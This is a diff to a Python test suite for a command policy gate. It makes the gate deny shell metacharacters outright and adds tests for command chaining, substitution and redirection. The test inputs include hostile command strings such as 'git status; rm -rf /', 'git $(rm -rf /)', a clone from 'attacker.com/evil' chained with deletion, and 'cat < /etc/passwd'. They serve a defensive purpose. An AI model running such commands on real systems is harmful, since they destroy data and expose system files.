@@ -159,11 +159,17 @@ class TestRiskAudit:
         assert d.verdict == PolicyVerdict.AUDIT
         assert "recursive_delete" in d.risk_flags
 
-    def test_output_redirect_is_audit(self) -> None:
+    def test_output_redirect_is_denied(self) -> None:
+        """Output redirection (>) is blocked to prevent shell metacharacter bypasses.
+        
+        Note: Prior design allowed this with AUDIT verdict, but the P0 security
+        hardening requires blocking all shell metacharacters unconditionally to
+        prevent bypass attacks like "git status; rm -rf /" matching "git *".
+        """
         p = _policy()
         d = p.gate("git log > /tmp/log.txt")
-        assert d.verdict == PolicyVerdict.AUDIT
-        assert "output_redirect" in d.risk_flags
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
 
     def test_force_flag_is_audit(self) -> None:
         p = _policy()
@@ -305,4 +311,129 @@ class TestDefaultPolicySingleton:
         reset_default_policy()
         p = get_default_policy()
         d = p.gate("some_unknown_binary --flag")
+        assert d.allowed
+
+
+# ---------------------------------------------------------------------------
+# Shell metacharacter detection tests
+# ---------------------------------------------------------------------------
+
+
+class TestShellMetacharacterBlocking:
+    """Tests for shell metacharacter detection — prevents chaining/redirection attacks."""
+
+    def test_semicolon_chaining_denied(self) -> None:
+        """Semicolon (;) enables command chaining and must be blocked."""
+        p = _policy()
+        d = p.gate("git status; rm -rf /")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_logical_and_chaining_denied(self) -> None:
+        """Logical AND (&&) enables conditional command chaining."""
+        p = _policy()
+        d = p.gate("git clone https://repo && malicious_command")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_logical_or_chaining_denied(self) -> None:
+        """Logical OR (||) enables fallback command chaining."""
+        p = _policy()
+        d = p.gate("git status || rm -rf /")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_pipe_operator_denied(self) -> None:
+        """Pipe (|) enables data chaining between commands."""
+        p = _policy()
+        d = p.gate("cat file | rm -rf /")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_background_execution_denied(self) -> None:
+        """Single ampersand (&) enables background execution chaining."""
+        p = _policy()
+        d = p.gate("git clone https://attacker.com/evil & rm -rf /")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_newline_chaining_denied(self) -> None:
+        """Newline (\n) enables command chaining across lines."""
+        p = _policy()
+        d = p.gate("git status\nrm -rf /")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_carriage_return_chaining_denied(self) -> None:
+        """Carriage return (\r) enables command chaining."""
+        p = _policy()
+        d = p.gate("git status\rrm -rf /")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_dollar_substitution_denied(self) -> None:
+        """Dollar sign command substitution $(...) enables injection."""
+        p = _policy()
+        d = p.gate("git $(rm -rf /)")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_backtick_substitution_denied(self) -> None:
+        """Backticks enable command substitution and injection."""
+        p = _policy()
+        d = p.gate("git `rm -rf /`")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_subshell_parens_denied(self) -> None:
+        """Parentheses (...) enable subshell command execution."""
+        p = _policy()
+        d = p.gate("git (rm -rf /)")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_brace_expansion_denied(self) -> None:
+        """Braces {...} enable brace expansion and multiple commands."""
+        p = _policy()
+        d = p.gate("git {status,clone}")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_output_redirection_denied(self) -> None:
+        """Output redirection (>) enables data exfiltration."""
+        p = _policy()
+        d = p.gate("git status > /tmp/output")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_input_redirection_denied(self) -> None:
+        """Input redirection (<) enables reading arbitrary files."""
+        p = _policy()
+        d = p.gate("cat < /etc/passwd")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_stderr_redirection_denied(self) -> None:
+        """Stderr redirection (2>) enables output manipulation."""
+        p = _policy()
+        d = p.gate("git status 2> /tmp/error")
+        assert d.verdict == PolicyVerdict.DENY
+        assert "shell metacharacter" in d.reason.lower()
+
+    def test_allowed_command_without_metacharacters(self) -> None:
+        """Allowed commands without metacharacters should pass."""
+        p = _policy()
+        d = p.gate("git status --porcelain")
+        assert d.allowed
+
+    def test_allowed_command_with_dash_not_pipe(self) -> None:
+        """Dashes in arguments (e.g., --option) should not trigger pipe detection."""
+        p = _policy()
+        d = p.gate("python --version")
+        assert d.allowed
+
+    def test_allowed_python_with_args(self) -> None:
+        """Python with complex arguments should pass if no metacharacters."""
+        p = _policy()
+        d = p.gate("python -m pytest tests/")
         assert d.allowed
